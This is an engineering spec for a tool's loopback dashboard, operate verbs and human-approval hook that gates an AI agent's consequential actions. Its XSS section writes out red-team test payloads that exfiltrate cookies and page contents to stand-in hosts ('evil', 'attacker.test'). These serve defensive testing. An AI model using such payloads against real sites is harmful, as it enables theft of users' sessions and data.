# craw code — Implementation Spec: Dashboard, Operate Plane & HITL (M4, M4.5, M6)

This spec covers the *operate / observe / feedback* half of `craw code` — the fleet
dashboard over the `.crawfish/` ledger (M4), the operate plane that drives
optimize / deploy / control by composing existing `craw` verbs (M4.5), and the
human-in-the-loop approval, review, and diagnose loop that closes the self-generating
cycle (M6). It is grounded in [RFC 0001](../../rfcs/0001-craw-code.md) (§7 dashboard,
§12.2–§12.4 hardening), [SECURITY.md](../../architecture/SECURITY.md) ("the operate and
observe layer"), and the shipped primitives the RFC promises to *wire*, not reinvent:
`ObserverSurface`, `ScrubbingStore`, `CostBudget` / `CancelToken`, the deploy registry,
`LearningLoop.rollback`, the cost interval, the DLQ, and `craw replay --swap`.

Nothing here re-implements the engine. Every dashboard read goes through the
`ObserverSurface` / `Store` protocol; every operate verb shells the verb that already
ships; the HITL gate is a Claude Code **PreToolUse hook** the plugin ships at its root.
The non-negotiable: an agent must not fire a `--live`/consequential action, promote a
version, or render tainted ledger text without the enforcement seams below.

---

## Read-model & seam rules

Every M4 issue (and the dashboard surfaces of M4.5/M6) **must** honor these invariants.
They are the difference between "a dashboard" and "a dashboard that upholds the security
spine and survives the SQLite→Postgres swap."

1. **Read through `ObserverSurface(store, org_id=…)` and the `Store` protocol only.**
   The dashboard data layer imports
   `crawfish.observe.ObserverSurface` (`packages/crawfish/src/crawfish/observe.py:122`)
   and the `Store` protocol (`crawfish/store/base.py`). It **never** imports
   `SqliteStore` (`crawfish/store/sqlite.py`) or any concrete backend, and it issues **no
   raw SQL** — aggregations (cost rollups, fan-out progress, pass-rate %) are computed in
   Python over `ObserverSurface.run_info(...)` / `.events(...)` rows. This is the
   "import protocols, never a backend" rule of CLAUDE.md / ARCHITECTURE.md, recorded as
   **ADR 0008 (ObserverSurface seam)** — *(verify ADR number; no
   `docs/architecture/decisions/` dir exists yet, the directory + ADR must be created)*.

2. **Scrubbed surface only.** The surface is constructed over a `ScrubbingStore`
   (`crawfish/secrets.py:146`), so `ObserverEvent.detail` / `.data` and `RunInfo` are
   redacted before the Store write. The dashboard renders **only** what the surface
   returns; it never reaches past it to read a `.env`, a secret ref, or a sink
   destination.

3. **Loopback only.** The HTTP server binds `127.0.0.1` exclusively (extends
   `craw visualize`, which already binds loopback only — `docs/guide/visualize.md`).
   Never `0.0.0.0`, never behind a reverse proxy. No auth layer because there is no
   network surface. This is operate-layer rule 3 in SECURITY.md.

4. **`org_id` on every read.** The surface is constructed *per-org*
   (`ObserverSurface(store, org_id=args.org)`). A dashboard process scoped to org A must
   never surface a row from org B. Every verb in this spec carries `--org` (default
   `"local"`), threaded into the surface constructor (CRA-275).

5. **Ledger text is untrusted markup.** Scrubbing removes *secrets*; it does **not**
   neutralize HTML/JS. `ObserverEvent.detail`, `RunInfo.version`, item ids, and any
   model-derived field are `Flow.FLUID` and may carry an injected `<script>` or an
   `<img src=http://attacker/...>` SSRF beacon. The dashboard **output-encodes every such
   field** (context-aware: HTML-body vs attribute vs URL) and serves a **strict CSP**
   (`default-src 'none'`). `pipeline` and `kind` are stable static identifiers
   (`observe.py:67` docstring) and are the only fields safe to filter on unencoded.

6. **Read-only by default; control is a separate, gated surface.** The dashboard never
   triggers a run or mutates state on render. Stop/resume/cancel buttons (M4.5/M6) POST to
   a loopback control endpoint that maps **1:1** onto a `craw manage` / `cancel` /
   `resume` call — and any *consequential* control passes through the HITL gate (M6).

---

## M4 — Fleet dashboard over the ledger

### CRA-252 — Dashboard data layer: read the `.crawfish/` ledger
**Milestone:** M4 · **Priority:** High · **Depends on:** none (foundation for 253/254)
**Context** — RFC §7 makes the dashboard "a reader over the event ledger." The ledger and
registry under `.crawfish/` are the source of truth, but the read path must not tempt a
concrete-backend import (RFC §12.3, "Dashboard reading `.crawfish/` invites importing a
concrete `SqliteStore`"). This issue builds the **typed read-model** every view sits on.

**Design** — A `crawfish.code.dashboard.data` module exposing a `DashboardData` read
facade constructed as `DashboardData(surface: ObserverSurface)` — it takes the surface,
never a store class. It composes:
- `ObserverSurface.run_info(pipeline=None, since=…)` → all `RunInfo` rows, newest first.
- `ObserverSurface.events(pipeline, since=…, kind=…)` → `ObserverEvent` stream.
- `DeployRegistry(store, org_id=…).entries()` and `manage_list(store, org_id=…)`
  (`crawfish.manage`) for the running-pipeline rows — already Store-backed, already
  scrubbed.
All cross-row aggregation (cost rollups, status counts) is pure Python over those typed
rows. No SQL, no `SqliteStore` symbol anywhere in the module. The facade returns Pydantic
view-models (below), so the HTTP layer serializes a typed snapshot rather than raw rows.

**Interface**
```python
# crawfish/code/dashboard/data.py
class DashboardData:
    def __init__(self, surface: ObserverSurface, registry: DeployRegistry) -> None: ...
    def fleet(self, *, now: float | None = None) -> FleetSnapshot: ...
    def runs(self, *, since: str = "-1d", pipeline: str | None = None) -> list[RunCard]: ...
    def events(self, *, since: str = "-1h", kind: str | None = None) -> list[ObserverEvent]: ...
```
`--json` snapshot (versioned, snapshot-tested under `craw.code.dashboard.v1`):
```json
{
  "schema": "craw.code.dashboard.v1",
  "org_id": "local",
  "generated_at": 1750000000.0,
  "fleet": [{"pipeline": "...", "status": "running", "uptime_s": 0.0,
             "next_fire": "08:00", "cost_today_usd": 0.0}],
  "runs": [{"run_id": "...", "pipeline": "...", "status": "done",
            "version": "0.3.1", "cost_usd": 0.31, "items": 3}],
  "events": [{"pipeline": "...", "kind": "cost.spike", "severity": "warn",
              "detail": "<encoded>", "run_id": "..."}]
}
```
Exit codes: `0` ok, `2` no ledger found (`dirty_init`/missing `.crawfish/`), `3` schema
skew vs CLI (CRA-269 envelope).

**Acceptance criteria**
- [ ] `DashboardData` imports `ObserverSurface`, `Store`, `DeployRegistry`, `manage_list`
      only; a grep test asserts no `SqliteStore`/`import sqlite`/raw-SQL string in the module.
- [ ] All aggregation is Python over typed rows; no SQL is constructed.
- [ ] `--json` matches the `craw.code.dashboard.v1` snapshot fixture byte-for-byte.
- [ ] Constructed per-`org_id`; rows from another org never appear.
- [ ] Missing `.crawfish/` returns exit `2` with a `craw.error.v1` envelope, not a stack trace.

**Test plan** — `packages/crawfish/tests/test_code_dashboard_data.py`:
in-memory/temp `Store` fixture seeded with `RunInfo`/`ObserverEvent` rows; assert
`FleetSnapshot`/`RunCard` shapes and the `--json` snapshot. A **no-backend-import**
static test greps the module source. A **two-org isolation** test writes rows under
`org_id="a"` and `org_id="b"`, builds the facade for `"a"`, asserts `"b"` rows are absent.

**Security review notes** — Operate-layer rules 1 (scrubbed surface) and the
import-protocols rule. The facade *inherits* scrubbing from the `ScrubbingStore` the
surface wraps — it must never reconstruct an unscrubbed surface. No fluid surface is
*rendered* here (that's CRA-253/UNFILED-XSS), but `detail`/`version` are carried through
tainted and must reach the HTTP layer unmodified so the encoder (UNFILED-XSS) is the
single chokepoint.

---

### CRA-253 — Dashboard: runs in flight, fan-out progress, cost burn
**Milestone:** M4 · **Priority:** High · **Depends on:** CRA-252
**Context** — RFC §7's first three bullets: runs in flight with `Batch` fan-out progress
(N of M), and cost burn against each run's `CostBudget` band. The data exists in `RunInfo`
(`items`, `cost_usd`, `status`) and the loop/program ledger (per-item DONE state); this
issue renders it as the herding surface.

**Design** — A `crawfish.code.dashboard.app` plain-HTML/JS server (no build step, like
`craw visualize`) served on `127.0.0.1`. Three panels, all fed by `DashboardData`:
- **Runs in flight** — `RunInfo` rows with `status == "running"`. Fan-out progress is
  `done_items / items` where `done_items` is counted from the loop-ledger DONE records the
  Supervisor already writes (`process_items` skips DONE — `docs/reference/operate.md`),
  read via a `surface`-level count, **not** a SQL `COUNT`.
- **Cost burn vs budget** — actual `RunInfo.cost_usd` against the run's declared interval
  from `crawfish.cost` (`total_usd` lower bound, `expected_usd`, `worst_case_usd` —
  `crawfish/cost.py:99-122`; note the lower bound field is `total_usd`, **not**
  `lower_usd`). Render a band with actual as a fill; when actual exceeds `expected_usd`,
  flag amber; exceeding `worst_case_usd` is impossible by the cost invariant and surfaces
  as a data-integrity warning.
- **$ today** — sum of today's `RunInfo.cost_usd` from the cost meter (`CostMeter`),
  matching `craw manage`'s `$ TODAY` column.
Auto-refresh by polling the `--json` snapshot endpoint every N seconds (no websockets, no
server push — keep the surface closed).

**Interface**
```text
craw code dashboard [--port 7878] [--org local] [--open]
# binds 127.0.0.1 only; --open launches a browser tab
```
Data contract for the runs view (one card):
```json
{"run_id": "...", "pipeline": "triage-bot", "status": "running",
 "items": 12, "done_items": 7, "cost_usd": 0.18,
 "budget": {"total_usd": 0.05, "expected_usd": 0.40, "worst_case_usd": 1.20}}
```
Exit codes: `0` clean shutdown, `2` port in use, `3` no ledger.

**Acceptance criteria**
- [ ] Server binds `127.0.0.1` only; a bind-address test asserts it refuses `0.0.0.0`.
- [ ] Fan-out progress renders `done/total` from ledger DONE counts via the surface (no SQL).
- [ ] Cost band uses `total_usd`/`expected_usd`/`worst_case_usd`; actual > `expected_usd`
      renders amber; the cost-invariant ordering holds in the rendered band.
- [ ] `$ today` equals the `craw manage` `$ TODAY` for the same fixture.
- [ ] `--json` snapshot stable under `craw.code.dashboard.runs.v1`.

**Test plan** — `packages/crawfish/tests/test_code_dashboard_runs.py`: temp Store seeded
with a running batch (12 items, 7 DONE) and a per-run cost interval; assert the card's
`done_items=7`, the band ordering, and the amber threshold. A loopback-bind test asserts
the listener address is `127.0.0.1`. No live model call — all data is pre-seeded rows.

**Security review notes** — Loopback rule (operate-layer 3). Cost band is rendered from
scrubbed `RunInfo` only. `pipeline`/`status`/`run_id` are static identifiers; `version`
and any `detail` shown on a card go through the UNFILED-XSS encoder. The polling endpoint
is the only network surface and is loopback-bound.

---

### CRA-254 — Dashboard: eval/tune/refine status + version lineage
**Milestone:** M4 · **Priority:** Medium · **Depends on:** CRA-252
**Context** — RFC §7 bullets 3–4: eval/tune/refine pass rates, per-metric deltas vs
baseline, `winner` shas, `stopped_reason`, and `learn` promotion/rollback lineage. The
optimizer verbs already emit these to the audit trail (`_opt_audit` in `cli.py`;
`LearningLoop` records promotion/rollback — `learning.py:117,335`); this view reads them
back.

**Design** — Two panels over `DashboardData`:
- **Optimize status** — read the optimizer audit events the verbs already write
  (`learn`/`tune`/`eval`/`refine` audit rows; `stopped_reason` ∈ `{budget, cancelled,
  max_trials, …}` from `learning.py:270`). Render per-component: last eval pass-rate,
  per-metric delta vs the stored baseline, `winner` sha (short), `stopped_reason`.
- **Version lineage** — the append-only lineage `LearningLoop.save`/`rollback` writes
  (`DefinitionStore` pointer-move + lineage event). Render a vertical timeline of
  promotions and pointer-move rollbacks with the parent→winner sha edges.
These are read from the **same surface/ledger**; lineage events are surfaced through the
`Store` protocol record/event APIs, never a direct table read.

**Interface**
```json
{
  "schema": "craw.code.dashboard.optimize.v1",
  "components": [{
    "component": "definitions/triage",
    "last_eval": {"pass_rate": 0.92, "baseline_pass_rate": 0.88,
                  "metric_deltas": {"f1": 0.04, "cost_usd": -0.01}},
    "winner_sha": "a1b2c3d", "stopped_reason": "max_trials",
    "lineage": [{"event": "promote", "parent": "0000", "sha": "a1b2c3d", "ts": 0.0},
                {"event": "rollback", "to": "0000", "ts": 0.0}]
  }]
}
```

**Acceptance criteria**
- [ ] Pass-rate and per-metric deltas render against the stored baseline.
- [ ] `winner` sha and `stopped_reason` shown verbatim from the audit row.
- [ ] Lineage timeline shows promotions and rollbacks in order, parent→winner edges correct.
- [ ] `--json` stable under `craw.code.dashboard.optimize.v1`.

**Test plan** — `packages/crawfish/tests/test_code_dashboard_optimize.py`: seed audit +
lineage rows for a fake tune (winner sha, `stopped_reason="budget"`) and a learn
promote+rollback pair; assert the rendered deltas and lineage ordering. Two-org isolation
on the lineage read.

**Security review notes** — Scrubbed surface only. `stopped_reason`/sha are stable, but
metric *labels* and any `detail` may be model-derived → encoded via UNFILED-XSS. No live
optimizer run in tests.

---

### UNFILED-SEAM — Dashboard reads via the ObserverSurface/Store seam, never a concrete SqliteStore
**Milestone:** M4 · **Priority:** Urgent · **Depends on:** CRA-252
**Context** — RFC §12.3 flags this as **Urgent**: a dashboard reading `.crawfish/` is the
single most likely place to violate "the product model imports protocols, never a backend"
(CLAUDE.md). One stray `from crawfish.store.sqlite import SqliteStore` and the cloud/scale
swap stops being a driver swap.

**Design** — Make the invariant *enforced*, not just followed. (a) The dashboard package
depends only on `crawfish.observe` and `crawfish.store.base` (the `Store` protocol) and
`crawfish.manage`/`crawfish.deploy` registries — all protocol- or surface-typed. (b) A
construction seam: `craw code dashboard` resolves the project's configured `Store` via the
existing config/factory path (the same one `craw visualize` uses) and hands it to
`ObserverSurface` / `DeployRegistry`; the dashboard code receives the *interface*. (c)
Record **ADR 0008** under `docs/architecture/decisions/` (create the dir) stating the
seam, the loopback bind, and aggregations-in-Python-over-scrubbed-rows decision, with the
rejected alternative (direct SQLite read for speed).

**Interface** — No new CLI surface; this is an architectural constraint + an
import-lint test + an ADR. The lint:
```python
# enforced by test: dashboard package must not name a concrete backend
FORBIDDEN = ("crawfish.store.sqlite", "SqliteStore", "import sqlite3", "SELECT ", "INSERT ")
```

**Acceptance criteria**
- [ ] An import/source-lint test fails if any dashboard module names a concrete backend or SQL.
- [ ] ADR 0008 exists, citing the seam, loopback, Python-aggregation, and rejected alternative.
- [ ] The dashboard runs against a non-Sqlite in-memory `Store` fixture unchanged (proves the swap).

**Test plan** — `packages/crawfish/tests/test_code_dashboard_seam.py`: source-grep lint
over the dashboard package; a run-against-`MemoryStore`-fixture test (a `Store` protocol
impl that is *not* `SqliteStore`) producing the same `--json` snapshot.

**Security review notes** — Architecture rule, not a fluid surface. Indirectly upholds the
scrubbing guarantee: by forcing all reads through `ObserverSurface`, the `ScrubbingStore`
wrapper can never be bypassed.

---

### UNFILED-XSS — Output-encode + strict CSP the dashboard against tainted-ledger XSS/SSRF
**Milestone:** M4 · **Priority:** High · **Depends on:** CRA-253
**Context** — RFC §12.2: "Dashboard renders tainted ledger text → stored XSS / SSRF beacon
on localhost." Scrubbing removes secrets, **not** markup. A malicious ticket body that
surfaces as an `ObserverEvent.detail` or a model-derived `version` can carry `<script>` or
an `<img src=http://attacker/leak?…>` beacon. On a loopback dashboard, stored XSS can read
other-org data the page has loaded and beacon it out — the loopback bind is *not* a
mitigation for XSS.

**Design** — A single output-encoding chokepoint in the HTTP/render layer:
- **Context-aware encoding** of every tainted field (`detail`, `data` values, `version`,
  item ids, metric labels): HTML-body → entity-encode `< > & " '`; attribute context →
  attribute-encode; URL context → reject non-`https`/relative schemes (kills
  `javascript:` and arbitrary-host beacons). `pipeline`/`kind`/`status`/`severity` are
  the only fields treated as trusted (stable static identifiers).
- **Strict CSP** on every response: `Content-Security-Policy: default-src 'none';
  script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self';
  base-uri 'none'; form-action 'none'; frame-ancestors 'none'`. No inline scripts/styles
  (the no-build JS ships as a same-origin file). This blocks both injected `<script>` and
  off-host `<img>`/`fetch` SSRF beacons even if encoding is bypassed — defense in depth.
- Additional headers: `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`.

**Interface** — Internal render helper `encode_field(value: str, ctx: Encoding) -> str`
and a response-header middleware. No CLI change. The `--json` endpoint sets
`Content-Type: application/json` and is never rendered as HTML.

**Acceptance criteria**
- [ ] Every tainted field passes through `encode_field` before reaching the HTML response.
- [ ] Strict CSP (`default-src 'none'`) + `nosniff` + `no-referrer` on every HTML response.
- [ ] A `javascript:`/non-https URL in a `data` field is rejected, not rendered as a link.
- [ ] No inline `<script>`/`<style>`; JS/CSS served as same-origin static files.

**Test plan** — `packages/crawfish/tests/test_code_dashboard_xss.py`: seed an
`ObserverEvent` whose `detail` is `"<script>fetch('http://evil/'+document.cookie)</script>"`
and another with `data={"link": "javascript:alert(1)"}` and an `<img src=http://evil/...>`
SSRF payload; render the page; assert the script is entity-encoded (no live `<script>`
node), the `javascript:`/off-host URL is rejected, and the CSP header is present. Add the
payload to `crawfish.testing.redteam_attacks` and reference it from
`packages/crawfish/tests/test_redteam_security.py` (SECURITY.md requires a new fluid
surface to add at least one injection payload).

**Security review notes** — This is a **new fluid surface**: the dashboard rendering
tainted ledger text. SECURITY.md's behavioural gate requires the red-team payload above.
Red-team payload (concrete):
`ObserverEvent(pipeline="triage-bot", kind="quality.flag",
detail="<img src=x onerror=fetch('http://attacker.test/'+document.body.innerHTML)>")` —
the test asserts it renders inert and the CSP `img-src 'self'` + `connect-src 'self'`
blocks the beacon. Loopback (rule 3) limits *who* can reach the page but not what injected
script does once loaded — hence encoding + CSP are mandatory, not optional.

---

### UNFILED-COST — org_id-scoped dashboard + aggregate cost-vs-ceiling view
**Milestone:** M4 · **Priority:** High · **Depends on:** CRA-252, CRA-273 (estimate/budget ceiling)
**Context** — RFC §12.4 (Urgent) wants a `[budget]` ceiling the dashboard renders and that
halts agent `--live` calls; RFC §12.3 (CRA-275) requires `org_id` threaded so there is no
cross-tenant leakage. This issue renders **aggregate spend vs the project ceiling**, scoped
to one org.

**Design** — Read the `[budget]` ceiling from `crawfish.toml` (config layer) and sum
`RunInfo.cost_usd` for the org/day from the surface. Render a **fleet-wide cost-vs-ceiling
gauge**: today's aggregate spend, the configured ceiling, and projected end-of-day from the
expected band. When aggregate spend crosses the ceiling, the gauge flips to a "ceiling
reached" state — the *same* signal the HITL gate (UNFILED-GATE) reads to halt agent
`--live` calls. The surface is always constructed `ObserverSurface(store, org_id=args.org)`;
the gauge is a pure Python sum over that org's rows only.

**Interface**
```text
craw code dashboard --org acme        # gauge sums only org "acme"
```
```json
{"schema": "craw.code.cost.v1", "org_id": "acme",
 "ceiling_usd": 5.00, "spent_today_usd": 3.10,
 "projected_today_usd": 4.20, "state": "ok"}   // ok | warn | ceiling_reached
```

**Acceptance criteria**
- [ ] Gauge sums only the constructed org's `RunInfo` rows.
- [ ] Ceiling read from `crawfish.toml [budget]`; missing ceiling → unbounded ("no ceiling").
- [ ] `state` flips `ceiling_reached` when aggregate ≥ ceiling; this is the signal the gate reads.
- [ ] `--json` stable under `craw.code.cost.v1`.

**Test plan** — `packages/crawfish/tests/test_code_dashboard_cost.py`: two-org Store
fixture (org A spends $3.10, org B $9.00, ceiling $5.00); build for org A → gauge shows
$3.10/`ok`, and org B's spend never contributes. Push org A over $5.00 → `ceiling_reached`.

**Security review notes** — `org_id` isolation (CRA-275 / tenancy rule). Cost rollup uses
scrubbed `RunInfo` only. The `ceiling_reached` state is the load-bearing handoff to the
HITL/budget gate — a tenant must never see or be gated by another tenant's spend.

---

## M4.5 — Operate plane (optimize / deploy / control)

### UNFILED-OPTIMIZE — `craw code optimize <component>`: orchestrate tune / refine / learn
**Milestone:** M4.5 · **Priority:** Urgent · **Depends on:** CRA-273 (estimate/budget), M3a optimize skill
**Context** — RFC §12.4 (Urgent): the optimization plane as an agent loop. The primitives
ship (`craw eval`, `tune`, `refine`, `learn` — `cli.py`; `LearningLoop`, `TuneSpec`,
`Objective`), but an agent has to know which inner loop to drive, scaffold `tune.toml`, seed
a baseline, and stay under budget. This verb is the orchestrator that composes them.

**Design** — `craw code optimize` is a thin driver that **composes existing verbs**, never
re-implements them:
1. **Scaffold** `tune.toml` (the `TuneSpec` authored form) for the component if absent,
   from a template (reference-only, no inline secrets — consistent with CRA-276).
2. **Seed baseline** via `craw eval --set-baseline` so the promotion gate has a real
   regression baseline (the F-3 rejection invariant needs one).
3. **Drive the right inner loop** under `--budget` (a `CostBudget` ceiling): `tune` when a
   knob space exists, `refine` when there is a Rubric goal, `learn` to self-version the
   winner. Choice is explicit via `--mode {tune,refine,learn,auto}`; `auto` inspects the
   component (knob space present → tune; Rubric present → refine) and is reported in the
   summary.
4. **Emit `--json` summary**: winner sha, per-metric deltas vs baseline, `stopped_reason`.
The budget is the shipped `CostBudget` (`core/context.py:33`); cancellation is the shipped
`CancelToken`. No new optimization engine.

**Interface**
```text
craw code optimize <component> [--mode auto] [--budget 2.00] [--seed 7] [--org local] [--json]
```
```json
{"schema": "craw.code.optimize.v1", "component": "definitions/triage",
 "mode": "tune", "winner_sha": "a1b2c3d", "promoted": true,
 "metric_deltas": {"f1": 0.04, "cost_usd": -0.01},
 "stopped_reason": "max_trials", "spent_usd": 1.18, "baseline_sha": "0000"}
```
Exit codes: `0` ran (promoted or not), `4` over budget before any trial, `5` no baseline
could be seeded, `1` security rejection (`craw.error.v1`, `retryable:false`).

**Acceptance criteria**
- [ ] Scaffolds `tune.toml` only when absent; never clobbers an existing one.
- [ ] Seeds a baseline via `eval --set-baseline` before driving the loop.
- [ ] Drives the mode-appropriate inner loop under `--budget`; over-budget halts with `stopped_reason="budget"`.
- [ ] `--json` summary carries winner sha, per-metric deltas, `promoted`, `stopped_reason`.
- [ ] Deterministic under `--seed`; fires no Sink (eval-mode only).

**Test plan** — `packages/crawfish/tests/test_code_optimize.py`: `MockRuntime` +
record/replay so no live call; assert `tune.toml` scaffolded, baseline seeded, loop driven,
`--json` snapshot under `craw.code.optimize.v1`. A budget test sets `--budget` below one
trial → `stopped_reason="budget"`, `promoted=false`. `auto`-mode selection test for a
knob-space component vs a Rubric component.

**Security review notes** — Operate-layer rule 4 (LLM optimization is cost-capped under
`CostBudget`). SECURITY.md rule 7: a consequential sink fires only in eval mode — `optimize`
must run eval-mode/frozen and **fire no Sink**. The winner is a generated artifact and must
pass the assembly gate before it can ship (SECURITY.md language-era table: "a Definition the
`craw code` loop produced … must pass the assembly gate"). `tune.toml` template is
reference-only (no inline secret/destination — CRA-276).

---

### UNFILED-DEPLOY — `craw code deploy <pipeline>` (+ default Observer rules) and `craw code fleet`
**Milestone:** M4.5 · **Priority:** High · **Depends on:** CRA-252 (data layer), UNFILED-OPTIMIZE (none hard)
**Context** — RFC §12.4 (High): operate whole pipelines. `craw deploy` and `craw manage`
ship (`crawfish.deploy`/`crawfish.manage`); the gap is the agent-friendly veneer that
deploys with sane default observers and lists/stops/restarts/tails the fleet, plus the
dashboard "Fleet" view.

**Design** — Two verbs, each composing the shipped path:
- `craw code deploy <pipeline>` → calls `crawfish.deploy.deploy(project_dir, name=…,
  store=…, schedule=…, org_id=…)` and **additionally scaffolds default Observer rules**
  (`Observer.cost_spike`, `Observer.failure_rate`, `Observer.stuck` — `crawfish.observe`)
  into `observers/` if none exist, so a freshly deployed pipeline is watched by default.
  The supervisor carries secrets by reference exactly as `craw deploy` (operate-layer rule
  2 — no secret in argv/session/registry).
- `craw code fleet` → composes `craw manage` (`manage_list` / `format_table` /
  `stop` / `restart_target`) for list/stop/restart/tail. `fleet --json` emits the
  `PipelineStatus` rows.

**Interface**
```text
craw code deploy <pipeline> [--schedule "0 8 * * *"] [--observers default|none] [--org local]
craw code fleet [--json]
craw code fleet stop    <name>
craw code fleet restart <name>
craw code fleet tail    <name>
```
```json
{"schema": "craw.code.fleet.v1", "pipelines": [
  {"name": "crawfish/triage-bot", "status": "running", "uptime_s": 22442.0,
   "next_fire": "08:00", "cost_today_usd": 0.42}]}
```
Exit codes: `0` ok, `1` no such pipeline, `2` schedule invalid.

**Acceptance criteria**
- [ ] `deploy` composes `crawfish.deploy.deploy`; no second supervisor implementation.
- [ ] `--observers default` scaffolds cost/failure/stuck rules only when `observers/` is empty.
- [ ] `fleet`/`stop`/`restart`/`tail` map 1:1 onto `manage_list`/`stop`/`restart_target`/`logs`.
- [ ] No secret appears in argv, session name, or the registry row (assert on the spawned argv).
- [ ] `fleet --json` stable under `craw.code.fleet.v1`.

**Test plan** — `packages/crawfish/tests/test_code_deploy_fleet.py`: injectable `spawn`
seam (per `deploy`'s `spawn: Spawner`) so no real daemon; assert the spawned argv carries
only name/dir/schedule (no secret), that default observers are scaffolded into a temp
`observers/`, and that `fleet --json` mirrors `manage_list`. Two-org isolation: a deploy in
org A is invisible to `fleet --org b`.

**Security review notes** — Operate-layer rule 2 (detached supervisor carries no secret) —
the argv-scrub test is the red line. Default observers themselves are an LLM-judge surface
only if a `judge=` Definition is attached; the scaffolded defaults are pure rules (cost
spike/failure rate/stuck) and free. Sink targets in the deployed pipeline remain
static-only (core rule 2). `org_id` on every registry read (CRA-275).

---

### UNFILED-CONTROL — `craw code cancel <run_id>` / `resume <run_id>` + dashboard stop/resume
**Milestone:** M4.5 · **Priority:** Medium · **Depends on:** CRA-253 (dashboard), UNFILED-DEPLOY
**Context** — RFC §12.4 (Medium): resume/cancel in-flight fan-out over the existing
`CancelToken` and the ledger resume path. The primitives ship (`CancelToken`
— `core/context.py:57`; `Supervisor.reconcile`/`process_items` resume from the loop ledger
for $0 — `operate.md`); this verb exposes them and wires the dashboard buttons.

**Design** —
- `craw code cancel <run_id>` → signals cooperative cancellation. For a foreground/
  in-process run this sets the run's `CancelToken.cancel()`; for a deployed run it signals
  the supervisor via the existing `stop`/registry path. Cancellation is cooperative —
  long loops already call `raise_if_cancelled()`.
- `craw code resume <run_id>` → re-enters the ledger resume path (`Supervisor.reconcile` /
  `process_items` skip-DONE), re-charging **$0** for completed loop iterations (tenancy
  folds into the cassette key, so a resume in org A never replays org B's work —
  SECURITY.md "Tenancy and run identity").
- Dashboard stop/resume buttons POST to a loopback control endpoint that maps 1:1 onto
  these verbs. A **consequential** resume (one whose remaining work can fire a `--live`
  sink) routes through the HITL gate (UNFILED-GATE) before re-entry.

**Interface**
```text
craw code cancel <run_id> [--org local] [--json]
craw code resume <run_id> [--org local] [--json]
```
```json
{"schema": "craw.code.control.v1", "run_id": "01HZ...", "action": "resume",
 "result": "resumed", "items_replayed_free": 7, "items_remaining": 5, "recharged_usd": 0.0}
```
Exit codes: `0` ok, `1` no such run, `6` cancel raced a completed run (no-op).

**Acceptance criteria**
- [ ] `cancel` sets the `CancelToken` / signals the supervisor; cooperative, never a hard kill of host code.
- [ ] `resume` re-enters the ledger resume path; completed items re-charge $0 (`recharged_usd: 0.0`).
- [ ] A cross-org resume sees none of another org's completed iterations.
- [ ] Dashboard buttons map 1:1 to the verbs; a consequential resume passes through the gate.

**Test plan** — `packages/crawfish/tests/test_code_control.py`: seed a partially-DONE batch
in a temp ledger; `resume` skips DONE and reports `items_replayed_free` with
`recharged_usd=0.0`; `cancel` sets the token and a subsequent loop step raises `Cancelled`.
Two-org test: resume under org A does not touch org B's loop-ledger rows. No live calls.

**Security review notes** — Tenancy/run-identity (SECURITY.md): cross-tenant resume cannot
replay another org's work — the cassette key folds `org_id`. Cancellation is cooperative
(no signal into out-of-process host code beyond the supervisor `stop`). A resume that would
fire a consequential sink is eval-mode/HITL-gated (rule 7 + UNFILED-GATE).

---

## M6 — HITL, feedback & debug

### UNFILED-GATE — Human approval / promotion gate: `craw code propose` / `apply` + PreToolUse hook
**Milestone:** M6 · **Priority:** High (security: Urgent) · **Depends on:** UNFILED-OPTIMIZE, CRA-273, the plugin (M3)
**Context** — RFC §12.2 (Urgent) "promotion/approval gate … reusing the secret-broker
approval queue, keyed on `(component, sha)`, fail-closed" **unified** with §12.4 (High)
HITL "`propose`/`apply` — stage a typed diff + cost estimate, human approves before
anything consequential/`--live`; reject → `learn --rollback`." A skill is a guideline an
injected agent can be talked out of (RFC §12.1); this gate is **enforcement**. The shipped
`diff`/`merge`, the cost interval, `LearningLoop.rollback`, and the Claude Code PreToolUse
hook are the seams.

**Design** — Two layers, both enforced:
1. **Staging (`propose`/`apply`).** `craw code propose <component>` stages a **typed,
   field-level diff** (the shipped `diff` — RFC roadmap "revolutionary capabilities") of
   the candidate vs the current frozen sha, **plus a cost estimate** (the cost interval
   `total_usd`/`expected_usd`/`worst_case_usd` from `crawfish.cost`), into an approval
   record keyed on `(component, candidate_sha)`. It reuses the **secret-broker approval
   queue** (`crawfish.secret_broker` / `docs/reference/secret-broker.md` — *(verify module
   name)*), fail-closed: no approval row → no apply. `craw code apply <component> <sha>`
   promotes the staged candidate **only if** an approval exists; **reject** triggers
   `LearningLoop.rollback(sha)` (`learning.py:335`) — a pure pointer move, no model call.
2. **The hook (the hard backstop).** The plugin ships a **PreToolUse hook** at the plugin
   root (`hooks/hooks.json`) that intercepts any Bash invocation matching a consequential
   `craw … --live` / sink command. The hook checks the approval queue for a matching
   approved `(component, sha)` and the budget-ceiling state (UNFILED-COST). On no approval
   or `ceiling_reached`, it returns `permissionDecision: "deny"` (or `"ask"` to force the
   human prompt); a hard violation exits **code 2**, which hard-stops the tool call **even
   in bypassPermissions mode**. This is the enforcement the RFC demands: the agent cannot
   talk its way past a hook the way it can past a skill. (Plugin-shipped *subagents* cannot
   carry hooks, but the plugin itself ships hooks at its root — this is the correct vehicle.)

**Interface**
```text
craw code propose <component> [--budget 2.00] [--json]   # stage diff + cost estimate, keyed (component, sha)
craw code apply   <component> <sha> [--json]             # promote IFF approved; else fail-closed
craw code reject  <component> <sha> [--json]             # → LearningLoop.rollback(sha), $0
```
PreToolUse hook decision payload (returned by the plugin hook):
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "craw code: consequential --live call requires an approved (component, sha); none staged. Run `craw code propose` first."
  }
}
```
`propose --json`:
```json
{"schema": "craw.code.propose.v1", "component": "definitions/triage",
 "candidate_sha": "a1b2c3d", "base_sha": "0000",
 "diff": [{"path": "policy.temperature", "from": 0.7, "to": 0.2}],
 "cost_estimate": {"total_usd": 0.05, "expected_usd": 0.40, "worst_case_usd": 1.20},
 "approval": "pending"}
```
Exit codes: `apply` → `0` applied, `7` no approval (fail-closed), `8` `ceiling_reached`;
hook → exit `2` on hard violation (hard-stop, overrides allow).

**Acceptance criteria**
- [ ] `propose` stages a typed diff + cost interval keyed on `(component, candidate_sha)`.
- [ ] `apply` promotes **only** with a matching approval; absent → exit `7`, no promotion (fail-closed).
- [ ] `reject` calls `LearningLoop.rollback(sha)` with **no model call**.
